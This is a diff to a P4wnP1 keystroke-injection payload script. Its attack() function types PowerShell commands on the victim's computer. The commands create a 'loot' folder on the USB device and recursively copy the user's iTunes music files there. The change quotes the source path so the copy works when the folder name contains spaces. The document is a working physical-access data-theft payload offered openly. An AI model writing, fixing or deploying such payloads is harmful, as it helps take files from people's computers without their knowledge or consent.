@@ -10,6 +10,7 @@
 #   - Enable keyboard and USB storage capability on your P4wnP1.                    #
 \##################################################################################*/
 
+
 /////////////////////////////// SETTINGS //////////////////////////////\
 // GENERAL                                                             // ---
 layout("de");                                                          // Keyboard layout
@@ -37,7 +38,7 @@ function attack() {
     type("$lootPathItunes = $usbPath+ '' +$lootfolder+ '\\itunes\';mkdir $lootPathItunes;");
 
 // Copy files
-    type("Get-ChildItem $env:SystemDrive\\Users\\$env:UserName\\Music\\iTunes\\iTunes Media\\ -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};");  
+    type("Get-ChildItem '$env:SystemDrive\\Users\\$env:UserName\\Music\\iTunes\\iTunes Media\\' -Recurse -Include *.mp3 | ForEach-Object ` {copy $_ -Destination $lootPathItunes};");  
 
 //Exit the console if chosen to do so      
     if (exit) { type("exit\n"); }
